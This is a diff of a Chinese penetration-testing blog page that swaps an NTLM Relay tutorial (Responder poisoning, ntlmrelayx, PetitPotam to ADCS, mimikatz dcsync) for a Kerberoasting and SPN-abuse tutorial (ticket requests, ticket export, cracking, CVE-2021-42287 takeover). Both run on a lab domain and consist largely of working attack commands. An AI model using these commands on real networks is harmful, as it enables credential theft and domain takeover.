@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内网渗透篇-NTLM Relay攻击, 学的越深越发现自己的渺小">
+    <meta name="keywords" content="内网渗透篇-域渗透之SPN利用, 学的越深越发现自己的渺小">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内网渗透篇-NTLM Relay攻击 | 学的越深越发现自己的渺小</title>
+    <title>内网渗透篇-域渗透之SPN利用 | 学的越深越发现自己的渺小</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内网渗透篇-NTLM Relay攻击</h1>
+                    <h1 class="description center-align post-title">内网渗透篇-域渗透之SPN利用</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-10
+                    2022-03-13
                 </div>
                 
 
@@ -459,204 +459,84 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="NTLM认证"><a href="#NTLM认证" class="headerlink" title="NTLM认证"></a>NTLM认证</h2><p><code>Windows</code>的身份认证方式有两种，一种是<code>NTLM</code>认证方式，即挑战Challenge/响应Response机制；另外一种就是<code>Kerberos</code>认证方式。</p>
-<p>早期，<code>Windows</code>域环境下使用<code>NTLM</code>作为认证方式，后来采用了<code>Kerberos</code>协议。在默认环境下，<code>NTLM</code>认证和<code>Kerberos</code>认证同时存在于域环境下。当我们指定主机名的时候，会选用<code>Kerberos</code>来作为认证方式。</p>
-<p><img src="/images/298.png"></p>
-<p>而当指定主机<code>ip</code>的时候，会采用<code>NTLM</code>认证方式。</p>
-<p><img src="/images/299.png"></p>
-<p><code>NTLM</code>身份认证可以分为两种，一种是本地认证，一种是网络认证。</p>
-<p><strong>本地认证</strong></p>
-<p><code>Windows</code>将用户的密码存储在本地计算机的<code>SAM</code>文件中，文件位置：<code>C:\Windows\System32\config\SAM</code>。密码的存储以<code>NTLM Hash</code>的方式进行存储。当用户输入密码进行本地认证时，首先系统会将明文密码处理成<code>NTLM Hash</code>，然后与<code>SAM</code>文件中的<code>Hash</code>进行比较，相同则认证通过。同时，会在<code>lsass.exe</code>进程中，保存一份明文密码。</p>
-<p>当获取到一台主机权限之后，可以利用<code>mimikatz</code>从<code>lsass</code>进程中导出密码，但是<code>Server 2012R2</code>以后版本及<code>Win10</code>默认是不存储明文密码。</p>
-<p><strong>网络认证</strong></p>
-<p><code>NTLM</code>的网络认证，仔细细分可以分为工作组环境下的认证和域环境下的认证。大致原理相同，都是采用<code>Challenge/Response</code>验证机制。唯一不同点是，服务端会向域控请求校验。</p>
-<p>1.（交互式登录到某客户机）用户使用：域名、用户名、密码，登陆到某台客户端。客户端计算并存储用户密码的加密散列值（Hash），然后将真实的密码丢掉（即不保存用户真实的密码）</p>
-<p>2.客户端将用户名以纯文本的方式发送到要访问的服务器</p>
-<p>3.服务器产生一个 16 字节的随机数并将该随机数发送给客户端，该随机数通常称为：挑战（Challenge）,并在本地缓存该Challenge</p>
-<p>4.客户端使用用户密码的散列值加密服务器发送过来的 Challenge，并将结果发回给服务器， 该步骤通常称为：应答 （Response）</p>
-<p>5.服务器将下面三项内容发送到域控制器 （Domain Controller）<br>用户名、缓存的Challenge、从客户端收到的经过加密的Challenge</p>
-<p>6.域控制器使用 用户名 从安全账号管理数据库 （Security Account Manager database）中获得用户密码的散列值， 并使用获得的密码散列值来加密 Challenge</p>
-<p> 7.域控制器比较步骤（6）中计算得到的加密后的 Challenge值与步骤（4）中客户端加密得到的 Response，如果两者一致，则认证通过</p>
-<h2 id="中继攻击原理解析"><a href="#中继攻击原理解析" class="headerlink" title="中继攻击原理解析"></a>中继攻击原理解析</h2><p>NTLM hash 分为 NTLMv1 NTLMv2 NTLM session v2 三种，NTLMv2 的强度比 NTLMv1 强了不少 ，我们在实战中，如果获得的是NTLMv1的话直接对其进行爆破就行了，而现实情况中我们遇到的是 NTLMv2，NTLMv2的密码强度高了不少，因此如果你没有一个超级强大的字典，你很难得到明文密码。那么，如果爆破行不通的话我们不妨试一下NTLM Relay攻击。</p>
-<p>在这个NTLM Relay中，我们就是要将截获的Net-NTLM Hash重放来进行攻击，从而实现对其他机器的控制，所以严格意义上应该叫作Net-NTLM Relay。</p>
-<p>微软在MS08-068中对smb reflect到smb做了限制，防止了同一主机从SMB协议向SMB协议的Net-NTLM-Hash Relay。这个补丁在 CVE-2019-1384(Ghost Potato) 被绕过。</p>
-<p>自从 MS08-068 漏洞修复之后无法再将 Net-NTLM哈希值传回到发起请求的机器上，除非进行跨协议转发，但是该哈希值仍然可以通过中继转发给另外一台机器。利用Responder结合其他中继工具可以进行自动化的拦截并且对哈希值进行中继转发。唯一的一个不足之处就是，在这之前需要在<strong>进行转发操作的机器上禁用SMB签名</strong>。但是除了个别的例外，<strong>所有的Windows操作系统都默认关闭了SMB签名</strong>。</p>
-<p>就是A登陆了administrator这个账户，我们通过手段拿到A的Net-NTLM Hash后无法直接把这个Hash传递回A，但是如果域内的B也可以通过administrator这个账户登录，那我们可以把从A处获得的Hash传递给B，拿到B处的administrator权限</p>
-<p>在开启了SMB Signing的情况下，在SMB协议利用NTLM SSP进行了身份验证后，后续的所有数据包，都会利用NTLM SSP生成的这个session key进行签名。SMB服务端收到后续的数据包后，也会检查数据包的签名，如果签名不对，则拒收。</p>
-<p>NTLM SSP在生成session key的时候，会需要用到账号密码的原始 LM HASH 或 NT HASH。而relay型的攻击，都是站在一个中间人的位置，我们是不可能知道原始 LM HASH或NT HASH的（如果知道了也就不需要 Relay 这种攻击手法了）。所以，我们是无法计算出来这个session key的，自然也就无法对数据包进行签名。</p>
-<p>SMB签名是一种服务器与客户端协商以使用继承的会话密钥对所有传入的数据包进行数字签名的配置。这样的话，即使NTLM会话还是可能被Relay，服务器也不会被利用，因为攻击者缺少会话密钥。在Active<br>Directory网络中<strong>只有域控制器默认开启SMB签名</strong>，其他的所有服务器或工作组默认不受保护。</p>
-<p>进行NTLM Relay攻击有两步：</p>
+                <h2 id="SPN概念"><a href="#SPN概念" class="headerlink" title="SPN概念"></a>SPN概念</h2><p>SPN(ServicePrincipal Names)服务主体名称，是服务实例(比如：HTTP、SMB、MySQL等服务)的唯一标识符。Kerberos认证过程使用SPN将服务实例与服务登录账户相关联，如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN。如果在整个林或域中的计算机上安装多个服务实例，则每个实例都必须具有自己的 SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN 始终包含运行服务实例的主机的名称，因此服务实例可以为其主机的每个名称或别名注册SPN。一个用户账户下可以有多个SPN，但一个SPN只能注册到一个账户。在内网中，SPN扫描通过查询向域控服务器执行服务发现。这对于红队而言，可以帮助他们识别正在运行重要服务的主机，如终端，交换机等。SPN的识别是kerberoasting攻击的第一步。</p>
+<p><strong>例子</strong></p>
+<p>当某用户需要访问MySQL服务时，系统会以当前用户的身份向域控查询SPN为MySQL的记录。当找到该SPN记录后，用户会再次与KDC通信，将KDC发放的TGT作为身份凭据发送给客户，并将需要访问的SPN发送给KDC。KDC中的TGS服务对TGT进行解密。确认无误后，由TGS将一张允许访问该SPN所对应的服务的ST服务票据和该SPN所对应的服务的地址发送给用户，用户使用该票据即可访问MySQL服务。</p>
+<h2 id="SPN类型"><a href="#SPN类型" class="headerlink" title="SPN类型"></a>SPN类型</h2><p>SPN分为两种类型：<br>1.一种是注册在活动目录的机器帐户(Computers)下，当一个服务的权限为 Local System 或 Network Service，则SPN注册在机器帐户(Computers)下。<br>2.一种是注册在活动目录的域用户帐户(Users)下，当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下。</p>
+<p><img src="/images/337.png"></p>
+<h2 id="注册SPN"><a href="#注册SPN" class="headerlink" title="注册SPN"></a>注册SPN</h2><p>SetSPN是一个本地Windows二进制文件，可用于检索用户帐户和服务之间的映射。该实用程序可以添加，删除或查看SPN注册。</p>
+<p>当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。</p>
+<p><strong>注：注册SPN需要域管理员权限，普通域成员注册会提示权限不够</strong></p>
+<pre><code>setspn -S SQLServer/DESKTOP-J552HP1.easc.com test1 //普通域用户</code></pre>
+<p><img src="/images/340.png"></p>
+<pre><code>setspn -S SQLServer/DESKTOP-J552HP1.easc.com DESKTOP-J552HP1 //主机名</code></pre>
+<p><img src="/images/341.png"></p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>因为域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN,所以攻击者会直接向域控制器发送查询请求，获取其需要的服务的SPN,从而知晓其需要使用的服务资源在哪台机器上。</p>
+<p>Kerberoasting 是域渗透中经常使用的一项技术，是通过 <strong>爆破TGS-REP</strong>实现，在TGS_REP的过程中用户将会收到由目标服务实例的NTLM hash加密生成的TGS(service ticket)，加密算法为RC4-HMAC，如果获得这个TGS，我们可以尝试穷举口令，模拟加密过程，进行破解。</p>
+<p>由于<strong>域内的任何用户都可以向域内的任何服务请求TGS</strong>，知道相关服务的SPN后，可以用SPN申请一张票据 ST(TGS Ticket)，如果Kerberos 协议设置票据为 <code>RC4加密</code>，则可通过爆破的方式得到服务对应用户的密码。</p>
+<h2 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h2><p>SPN扫描也称作“扫描Kerberos服务实例名称”。在活动目录中发现服务的最佳方法就是SPN扫描。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。</p>
+<p>与网络端口扫描相比，<strong>SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口</strong>（不会因触发内网中的IPS、IDS等设备的规则而产生大量的警告日志），因为SPN查询是 Kerberos票据行为的一部分，所以检测难度较大。</p>
+<p><strong>常用命令</strong></p>
+<pre><code>setspn -q */*
+查看当前域所有的SPN
+
+setspn -T domain_name -q */*
+查看指定域的SPN
+
+setspn -q */* | findstr &quot;MSSQLSvc&quot;
+搜索指定服务的SPN
+
+setspn -L username/hostname
+查找指定用户/主机名注册的SPN
+
+setspn -S &lt;service&gt;/&lt;computername&gt;.&lt;domainname&gt; &lt;domain-user-account&gt;
+setspn -S 服务名/机器名.域名 域用户
+-S 参数：验证不存在重复项后，添加随意 SPN</code></pre>
+<p><img src="/images/338.png"></p>
+<p><img src="/images/339.png"></p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>因为SPN是通过LDAP协议向域控制器进行查询的，所以，攻击者只要获得一个普通的域用户权限，就可以进行SPN扫描。</p>
+<p>因为每个重要的服务在域中都有对应的SPN,所以，攻击者不必使用复杂的端口扫描技术，只要利用SPN扫描技术就能找到大部分的应用服务器。</p>
+<p><strong>小知识点</strong></p>
+<p>只有域用户的是可以利用的，机器账户的不能用于远程连接，所以我们的关注点主要就在域用户下注册的SPN。</p>
+<p><strong>Powershell申请票据</strong></p>
+<p>常常一般不会使用域用户登录计算机，而是使用本地用户组，所以我们需要切换下用户</p>
+<pre><code>runas /user:test1@easc.com cmd
+runas /user:test1@easc.com powershell</code></pre>
+<p><img src="/images/336.png"></p>
+<p>powershell执行以下命令</p>
+<pre><code>Add-Type -AssemblyName System.IdentityModel</code></pre>
+<p><img src="/images/333.png"></p>
 <ul>
-<li>第一步是捕获Net-NTLM Hash</li>
-<li>第二步是重放Net-NTLM Hash</li>
+<li>请求单个TGS票据</li>
 </ul>
-<p><img src="/images/297.png"></p>
-<p>攻击的关键是如何中间截获数据包，获取到<code>Net-NTLM Hash</code>值。下面介绍一些常见的捕获<code>Net-NTLM Hash</code>方法。</p>
-<h2 id="怎么发起NTLM请求"><a href="#怎么发起NTLM请求" class="headerlink" title="怎么发起NTLM请求"></a>怎么发起NTLM请求</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193493">Windows内网协议学习NTLM篇之发起NTLM请求</a>这篇文章介绍的很详细</p>
-<h2 id="捕获Net-NTLM-Hash"><a href="#捕获Net-NTLM-Hash" class="headerlink" title="捕获Net-NTLM Hash"></a>捕获Net-NTLM Hash</h2><p>捕获Net-NTLM Hash又有两步：</p>
+<pre><code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPNTEST/DESKTOP-J552HP1.easc.com&quot;</code></pre>
+<p><img src="/images/331.png"></p>
 <ul>
-<li>第一步是需要使目标服务器向攻击者发起NTLM请求</li>
-<li>第二步是使用工具来捕获服务器发来的NTLM请求</li>
+<li>请求所有TGS票据</li>
 </ul>
-<p>那么如何能使目标服务器向攻击者发起NTLM请求呢？</p>
-<p>由于SMB、HTTP、LDAP、MSSQL等协议都可以携带NTLM认证的三类消息，所以只要是使用SMB、HTTP、LDAP、MSSQL等协议来进行NTLM认证的程序，都可以尝试向攻击者发送Net-NTLMhash从而让攻击者截获用户的Net-NTLMhash，也就是说我们可以通过这些协议来进行攻击</p>
-<p>比如浏览器、office word文档、pdf文档、explorer等。如果新发现一个这类应用程序，或者发现这些程序的一种调用方法，就会多出一种攻击手段。</p>
-<h3 id="利用LLMNR和NetBIOS欺骗获得Net-NTLMHash"><a href="#利用LLMNR和NetBIOS欺骗获得Net-NTLMHash" class="headerlink" title="利用LLMNR和NetBIOS欺骗获得Net-NTLMHash"></a>利用LLMNR和NetBIOS欺骗获得Net-NTLMHash</h3><p><strong>LLMNR</strong></p>
-<p>LLMNR 是一种基于协议域名系统（DNS）数据包的格式，使得两者的IPv4和IPv6的主机进行名称解析为同一本地链路上的主机，因此也称作多播 DNS。监听的端口为 UDP/5355，支持 IP v4 和 IP v6 ，并且在 Linux 上也实现了此协议。其解析名称的特点为端到端，IPv4 的广播地址为 224.0.0.252，IPv6 的广播地址为 FF02:0:0:0:0:0:1:3 或 FF02::1:3。</p>
-<p><strong>Windows系统名称解析顺序</strong></p>
-<pre><code>1.本地hosts文件（%windir%\System32\drivers\etc\hosts）
-2.DNS缓存/DNS服务器
-3.链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）</code></pre>
-<p>也就是说，如果在缓存中没有找到名称，DNS名称服务器又请求失败时，Windows系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是目标机器。当用户输入不存在、包含错误或者DNS中没有的主机名时，通过工具(responder)监听LLMNR和NetBIOS广播，攻击者可以伪装成受害者要访问的目标机器，并从而让受害者交出相应的登陆凭证。核心过程与arp欺骗类似，我们可以让攻击者作中间人，截获到客户端的Net-NTLMHash</p>
-<p>启动Responder准备毒化，这里responder的作用就是当访问一个不存在的共享路径，将名称解析降到LLMNR/NBNS时，来抓取网络中所有的LLMNR和NetBIOS请求并进行响应</p>
-<pre><code>responder -I eth0 </code></pre>
-<p>在域控上随便传递一个SMB流量</p>
-<pre><code>net use \\NtlmRelay</code></pre>
-<p>成功捕获Net-NTLMHash,可以看到这里</p>
-<p><img src="/images/306.png"></p>
-<h3 id="利用WPAD劫持获得Net-NTLMHash"><a href="#利用WPAD劫持获得Net-NTLMHash" class="headerlink" title="利用WPAD劫持获得Net-NTLMHash"></a>利用WPAD劫持获得Net-NTLMHash</h3><p><strong>WPAD</strong></p>
-<p><code>WPAD（Web Proxy Auto-Discovery Protocol）</code>是<code>Web</code>代理自动发现协议的简称，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。当系统开启了<strong>代理自动发现功能</strong>后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找代理服务器，如果找到了代理服务器，则会从代理服务器中下载一个名为<code>PAC（Proxy Auto-Config）</code>的配置文件。该文件中定义了用户在访问一个 URL 时所应该使用的代理服务器。浏览器会下载并解析该文件，并将相应的代理服务器设置到用户的浏览器中。在请求<code>WPAD</code>的过程中，如果服务端要求<code>401</code>认证，部分浏览器和应用将会自动用当前用户凭证进行认证</p>
-<p>攻击流程为：在当前网段进行投毒，通过<code>WPAD</code>欺骗，让用户来向我们进行<code>NTLM</code>认证，再将认证请求Net-NTLMHash中继到其他机器。</p>
-<p>当你的浏览器设置为 “自动检测代理设置” 的情况下，它就会下载攻击者<strong>事先准备好的wpad.dat文件</strong>，这样一来，客户端的流量就会经过攻击者的机器。</p>
-<p><img src="/images/308.png"></p>
-<p>responder</p>
-<pre><code> responder -I eth0 -v -F on -w on</code></pre>
-<p>Responder创建一个身份验证屏幕，并要求客户输入他们在域中使用的用户名和密码</p>
-<p><img src="/images/309.png"></p>
-<p>此时，员工没有安全意识的话就会写入在域中使用的用户名和密码。 最后，我们可以看到他们的Net-NTLM Hash</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>注：中继的用户需要是域管理员权限才行</strong></p>
-<h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><strong>环境</strong></p>
-<pre><code>kali 攻击机  IP:192.168.88.129
-Server-2016 IP:192.168.88.131 DC
-WIN10 主机名 EAS111 IP:192.168.88.140 域内普通机器
-WIN10 主机名 EAS3   IP:192.168.88.135 域内普通机器</code></pre>
-<p>在进行攻击之前，先使用Responder内的RunFinger.py脚本查看域内主机的SMB端口开放情况</p>
-<pre><code>./RunFinger.py -i 192.168.88.0/24</code></pre>
-<p><img src="/images/300.png"></p>
-<p>发现除了域控(192.168.88.131)其他的SMB签名都是关闭的的</p>
-<p>确定好目标主机关闭了SMB签名后使用MultiRelay.py进行攻击，由于域控打开了smb签名，所以只能对其他机器下手</p>
-<pre><code>python3 MultiRelay.py -t 192.168.88.140 -u ALL</code></pre>
-<p>然后在域控访问kali</p>
-<pre><code>net use \\192.168.88.129 /user:edu\Administrator chen@2023</code></pre>
-<p><img src="/images/301.png"></p>
-<p><img src="/images/302.png"></p>
-<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><h4 id="smbrelayx-py"><a href="#smbrelayx-py" class="headerlink" title="smbrelayx.py"></a>smbrelayx.py</h4><p>攻击者伪造一个恶意的SMB服务器，当内网中有机器Client1访问这个攻击者精心构造好的SMB服务器时， smbrelayx.py 脚本将抓到 Client1 的 Net-NTLM Hash ，然后 smbrelayx.py 用抓取到的 Client1 的 Net-NTLM Hash 重放给 Client2 </p>
-<p><img src="/images/307.png"></p>
-<p>先在kali上运行smbrelayx.py</p>
-<pre><code>python3 smbrelayx.py -h 192.168.88.135 -c whoami</code></pre>
-<p>再在域控上运行</p>
-<pre><code>net use \\192.168.88.129 /user:edu\Administrator chen@2023</code></pre>
-<p>可以看到返回了命令执行后的效果，以及使用的Net-Hash值</p>
-<p><img src="/images/303.png"></p>
-<h4 id="ntlmrelayx-py"><a href="#ntlmrelayx-py" class="headerlink" title="ntlmrelayx.py"></a><strong>ntlmrelayx.py</strong></h4><p>ntlmrelayx.py 脚本可以直接用现有的hash去尝试重放指定的机器</p>
-<p>首先先配置responder的配置文件，关闭对SMB和HTTP的监听，然后再启动</p>
-<pre><code>responder -I eth0 </code></pre>
-<p><img src="/images/305.png"></p>
-<p>执行ntlmrelayx脚本</p>
-<pre><code>python3 ntlmrelayx.py -t 192.168.88.140 -c ipconfig</code></pre>
-<p>在域控上访问kali</p>
-<pre><code>net use \\192.168.88.129 /user:edu\Administrator chen@2023</code></pre>
-<p>成功中继执行命令</p>
-<p><img src="/images/304.png"></p>
-<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>在实际的网络拓扑环境下，一般都是通过团队服务器向目标主机上传一个<code>beacon</code>后获取权限。此时进行中继攻击就会存在几个问题，比如：目标445端口已经被占用，所以不能直接嗅探该端口传入的流量。又或者目标<code>Windows</code>主机上没有一些语言环境，操作不方便。我们也不可能被动等待他人的触发，这样不确定性就太多了。</p>
-<p>因此，在对抗过程中，可以使用端口流量的重定向，以及流量转发，代理来实现攻击机通过<code>TeamServer</code>攻击内网。</p>
-<p><code>PortBender</code>工具可以用于端口流量的重定向，工具地址：<code>https://github.com/praetorian-inc/PortBender</code>，将<code>PortBender.cna</code>和<code>PortBender.dll</code>放在同一个目录，并将<code>PortBender.cna</code>导入到<code>Cobalt Strike</code>中。</p>
-<p>当<strong>获取一个<code>SYSTEM</code>权限的<code>beacon</code>之后</strong>，通过<code>upload</code>命令将<code>WinDivert64.sys</code>或者<code>WinDivert32.sys</code>上传到目标主机（根据目标主机的类型），然后执行:</p>
-<p><strong>权限要管理员才行</strong></p>
-<pre><code>upload /tool/NeiWang/PortBender/WinDivert64.sys
+<pre><code>setspn -q */* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;</code></pre>
+<p><img src="/images/332.png"></p>
+<p>这里<strong>报错不要紧</strong>，Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。</p>
+<p><strong>使用mimikatz导出所有票据</strong></p>
+<pre><code>kerberos::list /export</code></pre>
+<p><img src="/images/334.png"></p>
+<p><strong>破解票据</strong></p>
+<p>爆破脚本：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast/">https://github.com/nidem/kerberoast/</a></p>
+<pre><code>python3 tgsrepcrack.py password.txt 1-40a10000-test1@SPNTEST~DESKTOP-J552HP1.easc.com-EASC.COM.kirbi</code></pre>
+<p>密码字典自己弄一个</p>
+<p><img src="/images/335.png"></p>
+<p><strong>①利用CVE-2021-42287&amp;42278拿下域控</strong></p>
+<pre><code>python3 sam_the_admin.py &quot;edu/test1:chen@2021&quot; -dc-ip 192.168.80.151 -shell </code></pre>
+<p><img src="/images/342.png"></p>
+<p><strong>②利用kerberoast.py修改ST票据内容</strong></p>
+<pre><code>python3 kerberoast.py -p chen@2021 -r 1-40a10000-administrator@SQLServer~eas111.edu.org-EDU.ORG.kirbi -w test.kirbi -g 512
 
-PortBender redirect 445 8445</code></pre>
-<p>此时会将445端口的流量重定向到8445端口</p>
-<p><img src="/images/311.png"></p>
-<p>接下来配置<code>rportfwd</code></p>
-<p><code>Cobalt Strike</code>工具自带的<code>rportfwd</code>，用于远程端口转发，即将目标机器的某个端口流量全部转发到远端指定的一个端口，命令如下：</p>
-<pre><code>rportfwd 8445 192.168.80.131 445</code></pre>
-<p>表示将此台（受控端）主机8445端口的流量转发到攻击机（192.168.80.131）的445端口上。也就是说445端口的流量此时通过重定向，发送给了8445端口，由于远程端口转发，本地8445端口流量全部转发到远程主机的445端口上。</p>
-<p><img src="/images/312.png"></p>
-<p>此时设置一个代理，通过代理运行<code>nltmrelayx.py</code>进行中继攻击的监听：</p>
-<pre><code># 配置代理/etc/proxychains4.conf
-socks4 192.168.80.130 1080
+python3 kerberoast.py -p chen@2021 -r 1-40a10000-administrator@SQLServer~eas111.edu.org-EDU.ORG.kirbi -w test.kirbi -u 500
 
-# 中继攻击监听
- proxychains python3 smbrelayx.py -h 192.168.88.135 -c &#39;type C:\1.txt&#39;
-
-#在域控上执行IPC连接
-net use \\192.168.88.140\ipc$ /user:edu\administrator chen@2023</code></pre>
-<p><img src="/images/310.png"></p>
-<p>成功中继到192.168.88.135机器上。单纯利用这种方式被动的等待比较鸡肋。在这种情况下并不是进行被动收集<code>Net-NTLM Hash</code>，而是通过主动攻击的方式。</p>
-<h3 id="Spooler打印机漏洞"><a href="#Spooler打印机漏洞" class="headerlink" title="Spooler打印机漏洞"></a>Spooler打印机漏洞</h3><p><strong>中继攻击监听</strong></p>
-<pre><code>proxychains python3 smbrelayx.py -h 192.168.88.135 -c &#39;type C:\1.txt&#39;</code></pre>
-<p>利⽤socks触发强制回连</p>
-<pre><code>proxychains python3 printerbug.py edu.org/eas11:chen@2020@192.168.88.131 192.168.88.140</code></pre>
-<p><img src="/images/314.jpg"></p>
-<p><img src="/images/313.png"></p>
-<p>成功触发中继</p>
-<h3 id="利用PetitPotam中继ADCS接管域"><a href="#利用PetitPotam中继ADCS接管域" class="headerlink" title="利用PetitPotam中继ADCS接管域"></a><strong>利用<code>PetitPotam</code>中继<code>ADCS</code>接管域</strong></h3><p>在PrintNightmare爆发之后，很多企业会选择关闭spooler服务，使得Printerbug失效。在Printerbug逐渐失效的今天，PetitPotam来了，他也可以指定域内的一台服务器，并使其对攻击者选择的目标进行身份验证。而且在低版本(16以下)的情况底下，可以匿名触发。</p>
-<p><strong>原理</strong></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/282912.html">使用PetitPotam代替Printerbug</a></p>
-<p>在08和12的环境，默认在<code>网络安全:可匿名访问的命名管道</code>中有三个<code>netlogon</code>、<code>samr</code>、<code>lsarpc</code>。因此在这个环境下是可以匿名触发的，16以上这个默认就是空了，需要至少一个域内凭据。</p>
-<p><img src="/images/329.png"></p>
-<p><strong>利用</strong></p>
-<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1873728">ADCS之中继攻击</a>这篇文章从环境搭建到复现都讲的很清楚。</p>
-<p>自己复现失败了，卡在认证这步。有师傅可以解答下吗？我的环境是DC Server2016,被控机器WIN10</p>
-<p><img src="/images/317.png"></p>
-<p><img src="/images/315.png"></p>
-<p><img src="/images/316.png"></p>
-<p><strong>贴上其他师傅复现的过程</strong></p>
-<p><img src="/images/318.png"></p>
-<p>域内定位CA机器需要<strong>域内用户</strong></p>
-<pre><code>certutil -config - -ping</code></pre>
-<p><img src="/images/314.png"></p>
-<p>测试与CA服务器的网络连通</p>
-<p><img src="/images/330.png"></p>
-<p>可以看到，在默认情况下，证书注册服务、证书注册策略 web 服务、网络设备注册服务通过授权 http 头支持协商身份验证，支持 kerberos 及 NTLM。所以攻击者可以在这里进行中继攻击。</p>
-<p>攻击机器开启本地监听并将证书颁发机构(CA)设置为目标，即目标DC 192.168.174.2</p>
-<pre><code>#格式：
-python3 ntlmrelayx.py -t http://&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs 
-
-#示例：
-python3 ntlmrelayx.py -t http://192.168.174.160/certsrv/certfnsh.asp -smb2support --adcs</code></pre>
-<p><img src="/images/319.png"></p>
-<p>利用Spooler打印机服务漏洞强制认证</p>
-<pre><code>#格式：
-python printerbug.py domain/username:password@&lt;targetName or Address&gt; &lt;hostname to connect to&gt;
-
-#示例:
-python3 printerbug.py hacke/testuser:&#39;test@123&#39;@dc.hacke.testlab 192.168.174.129</code></pre>
-<p><img src="/images/320.png"></p>
-<p>或者使用Petitpotam.py脚本</p>
-<pre><code>#格式：
-python Petitpotam.py -d domain -u username -p password &lt;RESPONDERIP&gt; &lt;TARGET&gt;
-
-#示例：
-python3 PetitPotam.py -d hacke.testlab -u Al1ex -p &#39;Kksvqm@123&#39; 192.168.174.129 192.168.174.160</code></pre>
-<p><img src="/images/321.png"></p>
-<p>得到证书信息</p>
-<p><img src="/images/322.png"></p>
-<p>利用上面获取到的证书，获取TGT并注入</p>
-<pre><code>#格式：
-Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt
-
-#示例：
-Rubeus.exe asktgt /user:DC$ /certificate:打印出来的base64证书数据 /ptt</code></pre>
-<p><img src="/images/323.png"></p>
-<p><img src="/images/324.png"></p>
-<p>查看票据信息，访问域控</p>
-<p><img src="/images/325.png"></p>
-<p><img src="/images/326.png"></p>
-<p>可以利用mimikatz，进行导出hash</p>
-<pre><code>KERBEROS::List 
-lsadump::dcsync /user:krbtgt</code></pre>
-<p><img src="/images/327.png"></p>
-<p>或者使用dcsync</p>
-<pre><code>lsadump::dcsync /all /csv</code></pre>
-<p><img src="/images/328.png"></p>
-<p>然后就可以制作金票进行横向，制作后门。</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/308340.html">浅析域内NTLM Relay攻击</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/O1ZZTijzO_6AV1QuernbXA">你所不知道的NTLM Relay</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/293281.html">内网渗透之横向移动 – 针对Net NTLM Hash攻击</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/244375.html">内网渗透测试：NTLM Relay攻击分析</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193493">Windows内网协议学习NTLM篇之发起NTLM请求</a></p>
+#将票据权限变成域控权限
+kerberos::ptt test.kirbi #注入票据到当前会话中接管域控</code></pre>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/304685.html">域渗透-SPN与kerberoast攻击</a></p>
